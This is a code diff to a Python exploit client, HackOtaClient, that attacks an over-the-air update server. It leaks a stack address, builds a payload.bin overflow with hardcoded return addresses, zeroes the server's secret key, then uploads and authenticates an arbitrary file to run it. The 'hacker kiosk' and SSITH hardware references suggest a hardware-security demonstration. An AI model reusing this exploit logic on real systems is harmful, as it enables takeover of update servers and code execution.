@@ -38,6 +38,8 @@ class HackOtaClient:
     KEY_ADDRESS = {'FreeBSD': 0x147a0, 'Debian': 0x165b0}
     RETURN_ADDRESS = {'FreeBSD': 0x11c74, 'Debian': 0x11da4}
 
+    PAYLOAD_BIN = "payload.bin"
+
     @staticmethod
     def send_request(base_url: str, srvc_name: str, arg):
         """form request and patch ota client"""
@@ -45,14 +47,11 @@ class HackOtaClient:
         assert resp.status_code == 200, f"upload file request received status code {resp.status_code}"
         return resp.status_code, resp.content
 
-    def __init__(self, update_path, base_url, platform):
+    def __init__(self, base_url, platform='Debian'):
+        print(f"<{self.__class__.__name__}> Url: {base_url}, platform: {platform}")
+        base_url
         self.url = base_url
         self.platform = platform
-        self.update_filename = os.path.basename(update_path)
-
-        with open(update_path, "r+b") as f:
-            # read data from the update file
-            self.update_file_bytes = f.read()
 
         # state -- will attempt to get pointer info
         self.leaked_pointer = None
@@ -138,7 +137,7 @@ class HackOtaClient:
         ra_bytes = self.buffer_pointer.to_bytes(self.POINTER_SIZE, byteorder='little')
 
         # read data from temporary payload file
-        with open("payload.bin", "r+b") as f:
+        with open(HackOtaClient.PAYLOAD_BIN, "r+b") as f:
             payload_bytes = f.read()
             # make the payload a total of PAYLOAD_SIZE bytes while appending fp/ra_bytes
             payload_bytes = payload_bytes + \
@@ -147,7 +146,7 @@ class HackOtaClient:
                             fp_bytes + ra_bytes
 
         # rewrite the file, so we know what we actually sent
-        with open("payload.bin", "w+b") as f:
+        with open(HackOtaClient.PAYLOAD_BIN, "w+b") as f:
             f.write(payload_bytes)
 
         return payload_bytes
@@ -155,19 +154,21 @@ class HackOtaClient:
     def change_secret_key(self)->(bool,str):
         """
         Attempt to change the secret key to zeros, after the stack address has been recovered.
-       Returns a tuple - bool for was the attempt succesfull (true/false),
+        Returns a tuple - bool for was the attempt succesfull (true/false),
         and string containing the server request/response (so it can be displayed on hacker kiosk)
         Exceptions must be handled as the connection might be killed by SSITH hardware.
         """
         self.form_payload()
         self.write_payload()
-        payload_bytes = self.compile_payload()
-        self.request_filename(payload_bytes)
+        self.compile_payload()
+        self.prepare_file_for_upload(HackOtaClient.PAYLOAD_BIN)
         self.request_filename(self.update_filename)
         self.request_upload_file(self.update_file_bytes)
         code, content = self.request_authenticate_message(self.get_hmac().digest())
-        assert content == "Verification OK"
-        return True, None
+        if content == "Verification OK":
+            return True, code
+        else:
+            return False, code
 
     def hack_server(self)->(bool,str):
         """
@@ -179,7 +180,20 @@ class HackOtaClient:
             success = success and self.get_stack_address()[0]
         return success and self.change_secret_key()[0]
 
-    def prehack_server(self)->(bool, str):
+    def prepare_file_for_upload(self, update_path):
+        """
+        Read file and update internal variables
+        """
+        self.update_filename = os.path.basename(update_path)
+        with open(update_path, "r+b") as f:
+            # read data from the update file
+            self.update_file_bytes = f.read()
+
+    def upload_and_execute_file(self, update_path)->(bool, str):
+        """
+        Attempts to upload and authenticate file
+        """
+        self.prepare_file_for_upload(update_path)
         self.request_filename(self.update_filename)
         self.request_upload_file(self.update_file_bytes)
         code, content = self.request_authenticate_message(self.get_hmac().digest())
